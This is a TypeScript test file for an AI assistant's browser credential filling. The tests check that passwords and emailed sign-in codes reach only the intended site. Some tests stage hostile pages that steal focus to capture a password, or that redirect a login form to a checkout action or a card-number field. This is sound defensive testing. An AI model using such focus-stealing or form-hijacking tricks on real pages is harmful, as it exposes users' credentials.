        `document.querySelector('input[name=password]').addEventListener('input', () => { document.getElementById('go').disabled = true; ${enabled ? "setTimeout(() => document.getElementById('go').disabled = false, 400);" : ''} });`,
      );
      if (enabled) {
        await savedFill(item.id, ['username', 'password']);
        expect(posts).toHaveLength(1);
      } else {
        await expect(savedFill(item.id, ['username', 'password'])).rejects.toMatchObject({ code: 'forbidden' });
        expect(posts).toEqual([]);
        expect(await page.locator('input[name=username]').inputValue()).toBe('');
        expect(await page.locator('input[name=password]').inputValue()).toBe('');
      }
    });
  }

  async function binding(frame: Frame, kind: BrowserSecretField = 'password') {
    const target = await frame.locator('#chosen input').elementHandle();
    const submit = await frame.locator('#chosen button').elementHandle();
    if (!target || !submit) throw new Error('Native authentication controls missing');
    return bindBrowserSecretFields(
      page,
      [{ field: kind, target: { ref: 'e1', generation: 1, element: target, frame } as PinnedBrowserRef }],
      { ref: 'e2', generation: 1, element: submit, frame } as PinnedBrowserRef,
      new URL(frame.url()).hostname.split('.').slice(-2).join('.'),
    );
  }

  it('fills the exact cross-origin field without ambient keyboard insertion or disclosure to the focused parent', async () => {
    await page.goto('https://parent.example/login');
    const frame = page.frames().find((candidate) => candidate.url() === 'https://auth.example/login');
    if (!frame) throw new Error('Cross-origin authentication frame missing');
    const childSession = await connection.context.newCDPSession(frame);
    await childSession.detach();
    await page.locator('#untrusted').focus();
    const bound = await binding(frame);
    const nativeInsert = page.keyboard.insertText.bind(page.keyboard);
    const ambientInsert = vi.spyOn(page.keyboard, 'insertText').mockImplementation(async (value) => {
      // A regression to ambient insertion lets the page steal focus before Chrome receives the value.
      await frame.evaluate("parent.postMessage('steal-focus', 'https://parent.example')");
      await page.locator('body[data-stolen="yes"]').waitFor();
      await nativeInsert(value);
    });
    expect(await fillBoundBrowserSecrets(context(), bound, async () => [secret])).toEqual({ status: 'submitted' });
    expect(ambientInsert).not.toHaveBeenCalled();
    expect(await page.locator('body').getAttribute('data-captured')).toBeNull();
    expect(posts).toEqual([{ host: 'auth.example', body: `password=${secret}` }]);
  });

  for (const kind of ['username', 'code'] as const) {
    it(`fills and submits a ${kind} field through the same native boundary`, async () => {
      await page.goto('https://auth.example/login');
      await page.evaluate(
        `(() => { const field = document.querySelector('input'); field.type = 'text'; field.name = ${JSON.stringify(kind)}; field.autocomplete = ${JSON.stringify(kind === 'code' ? 'one-time-code' : 'username')}; })()`,
      );
      const bound = await binding(page.mainFrame(), kind);
      expect(await fillBoundBrowserSecrets(context(), bound, async () => [secret])).toEqual({ status: 'submitted' });
      expect(posts).toEqual([{ host: 'auth.example', body: `${kind}=${secret}` }]);
    });
  }

  for (const drift of ['field', 'form', 'action', 'readonly', 'disabled', 'document'] as const) {
    it(`refuses ${drift} drift after resolving without inserting or submitting the value`, async () => {
      await page.goto('https://auth.example/login');
      const bound = await binding(page.mainFrame());
      const filling = fillBoundBrowserSecrets(context(), bound, async () => {
        if (drift === 'document') await page.reload();
        else
          await page.evaluate(`(() => {
          const field = document.querySelector('input');
          const form = document.querySelector('form');
          const drift = ${JSON.stringify(drift)};
          if (drift === 'field') field.autocomplete = 'cc-number';
          else if (drift === 'action') form.action = '/checkout';
          else if (drift === 'readonly') field.readOnly = true;
          else if (drift === 'disabled') field.disabled = true;
          else { const replacement = form.cloneNode(false); form.replaceWith(replacement); replacement.append(...form.childNodes); }
        })()`);
        return [secret];
      });
      if (drift === 'document')
        await expect(filling).rejects.toMatchObject({
          code: 'forbidden',
          message: 'The host could not safely complete this sign-in. Take a fresh observation.',
        });
      else expect(await filling).toEqual({ status: 'origin_mismatch' });
      expect(await page.locator('input').inputValue()).toBe('');
      expect(posts).toEqual([]);
    });
  }

  it('navigates a fresh assistant page to a sign-in page and submits its native form past a hostile value setter', async () => {
    expect(page.url()).toBe('about:blank');
    const result = await executeBrowserBatch(
      context(),
      { actions: [{ kind: 'navigate', url: 'https://www.amazon.com/ap/signin' }] },
      { record: false },
    );
    expect(result).toMatchObject({ status: 'stopped', reason: 'navigated' });
    expect(page.url()).toBe('https://www.amazon.com/ap/signin');
    const bound = await binding(page.mainFrame());
    expect(await fillBoundBrowserSecrets(context(), bound, async () => [secret])).toEqual({ status: 'submitted' });
    await expect.poll(() => posts.length).toBe(1);
    expect(posts).toEqual([{ host: 'www.amazon.com', body: `password=${secret}` }]);
  });

  // Pins existing taint behaviour, not frame coverage: the hosting main document carries the taint
  // for every frame under it, so a cross-site frame needs no taint entry of its own.
  it('keeps screenshots refused after a secret enters a cross-site frame, until the hosting document is gone', async () => {
    await page.goto('https://parent.example/mirror');
    const frame = page.frames().find((candidate) => candidate.url() === 'https://auth.example/session');
    if (!frame) throw new Error('Cross-origin session frame missing');
    // Playwright opens a session only for a frame Chrome runs as its own out-of-process target.
    await (await connection.context.newCDPSession(frame)).detach();
    expect(await fillBoundBrowserSecrets(context(), await binding(frame), async () => [secret])).toEqual({
      status: 'cleared_after_submit',
    });
    await expect.poll(() => frame.locator('#mirror').textContent()).toBe(secret);
    const refused = await executeBrowserBatch(context(), { actions: [{ kind: 'screenshot' }] }, { record: false });
    expect(refused).toMatchObject({ status: 'stopped', reason: 'secret_field' });
    expect(JSON.stringify(refused)).not.toContain(secret);
    // Leaving the hosting document ends its taint, together with every frame document under it.
    await executeBrowserBatch(
      context(),
      { actions: [{ kind: 'navigate', url: 'https://parent.example/login' }] },
      { record: false },
    );
    expect(
      await executeBrowserBatch(context(), { actions: [{ kind: 'screenshot' }] }, { record: false }),
    ).toMatchObject({ status: 'completed', images: [{ mime_type: 'image/png' }] });
  });

  it('loads nothing speculatively, so every page is a request the document gate decides', async () => {
    await executeBrowserBatch(
      context(),
      { actions: [{ kind: 'navigate', url: 'https://parent.example/help/speculate' }] },
      { record: false },
    );
    await page.waitForTimeout(1_500);
    expect(parentDocuments).toEqual(['/help/speculate']);
  });
  describe("signing in with a code from the assistant's own mail", () => {
    beforeEach(async () => {
      await runMigrations(await initTestDb());
      await recordWebAlias(ALIAS);
      await createAgentGroup({
        id: 'external-email',
        name: 'external-email',
        folder: 'external-email',
        agent_provider: null,
        created_at: new Date().toISOString(),
      });
      await getDb().run(
        'UPDATE gws_ea_profile SET external_email_agent_group_id = ?, assistant_workspace_email = ? WHERE singleton = 1',
        'external-email',
        'assistant@example.test',
      );
      setActiveInbox({
        gmailAddress: async () => 'assistant@example.test',
        knownGmailAddress: () => 'assistant@example.test',
        wakeSignIn: () => undefined,
      } as unknown as InboxRuntime);
    });
    afterEach(() => {
      setActiveInbox(undefined);
    });

    /** The site's email reaches the assistant inbox, and the isolated interpreter answers its claim. */
    async function deliver(value: string): Promise<void> {
      const mail = parseGmailMessage({
        id: 'sign-in-code',
        threadId: 'sign-in-code',
        labelIds: ['INBOX'],
        internalDate: String(Date.now()),
        payload: {
          mimeType: 'text/plain',
          headers: [
            { name: 'Authentication-Results', value: 'mx.google.com; dkim=pass header.d=auth.example' },
            { name: 'From', value: 'login@auth.example' },
            { name: 'To', value: ALIAS },
            { name: 'Subject', value: 'Your sign-in code' },
          ],
          body: { data: Buffer.from(`Your code is ${value}`).toString('base64url') },
        },
      });
      expect(await routeSignInMail(mail, new Date())).toBe(true);
      const [interpreter] = await getSessionsByAgentGroup('external-email');
      expect(await answerSignInReply({ kind: 'code', value }, interpreter)).toEqual({ status: 'accepted' });
    }

    it('fills the alias, lets the agent press Send code, then fills the emailed code and submits it', async () => {
      await page.goto('https://auth.example/code-login');
      expect(await executeSignInCode(context(), await refsFor({ email_field: 'Email' }))).toEqual({
        status: 'filled',
      });
      const { send } = await refsFor({ send: 'Send code' });
      expect(
        await executeBrowserBatch(context(), { actions: [{ kind: 'click', ...send }] }, { record: false }),
      ).toMatchObject({ status: 'stopped', reason: 'navigated' });
      await expect.poll(() => page.locator('h1').textContent()).toBe('Check your email');
      await deliver('482913');
      // The code waits for a step that names its field.
      expect(await executeSignInCode(context(), {})).toEqual({ status: 'code_field_needed' });
      const result = await executeSignInCode(context(), await refsFor({ code_field: 'Code', submit: 'Verify' }));
      expect(result).toEqual({ status: 'code_filled' });
      expect(posts.map((post) => Object.fromEntries(new URLSearchParams(post.body)))).toEqual([
        { email: ALIAS },
        { code: '482913' },
      ]);
      await expect.poll(() => page.locator('h1').textContent()).toBe('Signed in');
      expect(JSON.stringify({ result, observation: await observePage(page) })).not.toContain('482913');
    });

    it('answers origin_mismatch for a code field on another site, keeping the code', async () => {
      await page.goto('https://auth.example/code-login');
      await executeSignInCode(context(), await refsFor({ email_field: 'Email' }));
      await deliver('482913');
      await executeBrowserBatch(
        context(),
        { actions: [{ kind: 'navigate', url: 'https://parent.example/elsewhere' }] },
        { record: false },
      );
      await page.setContent(
        '<form method="post" action="/verify"><label>Code<input name="code"></label><button type="submit">Verify</button></form>',
      );
      expect(await executeSignInCode(context(), await refsFor({ code_field: 'Code', submit: 'Verify' }))).toEqual({
        status: 'origin_mismatch',
      });
      expect(posts).toEqual([]);
      // The refusal spends nothing: the same code still completes on the claimed site.
      await executeBrowserBatch(
        context(),
        { actions: [{ kind: 'navigate', url: 'https://auth.example/code-login' }] },
        { record: false },
      );
      await page.setContent(
        '<form method="post" action="/code/verify"><label>Code<input name="code"></label><button type="submit">Verify</button></form>',
      );
      expect(await executeSignInCode(context(), await refsFor({ code_field: 'Code', submit: 'Verify' }))).toEqual({
        status: 'code_filled',
      });
      expect(posts).toEqual([{ host: 'auth.example', body: 'code=482913' }]);
    });
  });
});
